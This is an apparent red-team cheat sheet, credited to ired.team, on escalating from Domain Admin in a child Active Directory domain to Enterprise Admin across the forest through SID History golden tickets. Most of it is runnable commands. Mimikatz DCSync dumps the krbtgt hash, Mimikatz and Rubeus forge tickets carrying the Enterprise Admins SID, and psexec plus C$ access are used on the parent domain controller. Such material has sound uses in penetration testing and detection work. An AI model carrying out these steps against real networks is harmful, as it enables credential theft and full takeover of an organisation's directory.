# From Domain Admin to Enterprise Admin (Child Domain Privilege Escalation)

Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain

## Overview

Abuse Parent-Child Domain Trust Relationships to escalate from DA on child domain to EA on root domain (Forest privilege escalation).

## Domain Trust Concepts

- **Parent/Child**: Two-way transitive trust by default
  - `offense.local` (parent) ↔ `red.offense.local` (child)
  - `BiDirectional` — members can authenticate cross-domain
- **Forest Trust**: Separate forests; one-way or two-way configurable

### Check Trusts
```powershell
Get-ADTrust -Filter *
nltest /domain_trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

## Attack Path: DA on Child → EA on Parent

### Using Extra SID / SID History Attack

Prerequisites:
- DA on child domain `red.offense.local`
- Know the SID of Enterprise Admins group in parent (`offense.local`)

### Steps

**1. Dump child domain krbtgt hash (as DA)**
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:red\krbtgt"'
```

**2. Get SID of child domain**
```powershell
Get-ADDomain | select DomainSID
```

**3. Get SID of Enterprise Admins group in root domain**
```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server offense.local | select SID
# SID format: S-1-5-21-<root-domain>-519
```

**4. Forge Golden Ticket with EA SID in SIDHistory (Extra SID)**
```powershell
# Mimikatz
kerberos::golden /user:Administrator /domain:red.offense.local /sid:<child-domain-SID> /krbtgt:<krbtgt-hash> /sids:<EA-SID> /ptt

# Rubeus
Rubeus.exe golden /user:Administrator /domain:red.offense.local /sid:<child-SID> /krbtgt:<hash> /sids:<EA-SID> /ptt
```

**5. Access parent domain resources as EA**
```cmd
dir \dc01.offense.local\c$
psexec \dc01.offense.local cmd.exe
```

## Empire Module Path

```
usemodule credentials/mimikatz/dcsync
usemodule credentials/mimikatz/golden_ticket
```

## Notes

- Key insight: SIDHistory injection allows extra SIDs to be included in Kerberos ticket
- EA SID (S-1-5-21-<root>-519) grants full control over the forest
- Requires DA on child domain first (or equivalent)
